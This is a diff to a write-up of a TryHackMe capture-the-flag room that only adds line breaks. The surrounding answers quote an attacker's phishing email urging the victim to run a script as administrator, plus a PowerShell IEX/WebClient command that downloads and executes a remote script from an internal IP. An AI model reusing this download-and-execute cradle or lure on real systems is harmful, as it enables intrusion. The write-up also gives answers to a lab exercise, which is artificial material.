@@ -37,6 +37,8 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 <p>1.2. What was the body of the email that was sent by the attacker?<br>
 <code>Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm</code></p>
 
+<br>
+
 <img width="1359" height="475" alt="image" src="https://github.com/user-attachments/assets/2eeffd47-5e0d-4aa1-a5ac-a6dd33940aed" />
 
 <br>
@@ -44,6 +46,8 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 
 <p>1.3. What command initiated the malicious script download?<br>
 <code>IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')</code>
+
+<br>
 
 <img width="1343" height="590" alt="image" src="https://github.com/user-attachments/assets/7316026d-9aed-4619-a090-156c1bdf96ce" />
 
